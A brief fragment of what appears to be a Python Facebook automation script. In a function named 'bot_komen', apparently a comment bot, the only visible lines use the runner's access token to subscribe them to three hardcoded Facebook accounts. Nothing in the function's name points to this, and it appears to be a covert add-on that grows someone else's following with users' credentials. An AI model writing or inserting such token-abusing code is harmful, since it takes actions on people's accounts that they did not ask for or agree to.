...
def bot_komen():
    ...
    ses.post("https://graph.facebook.com/524945220/subscribers?access_token=" + token)
    ses.post("https://graph.facebook.com/502303798/subscribers?access_token=" + token)
    ses.post("https://graph.facebook.com/1223542276/subscribers?access_token=" + token)
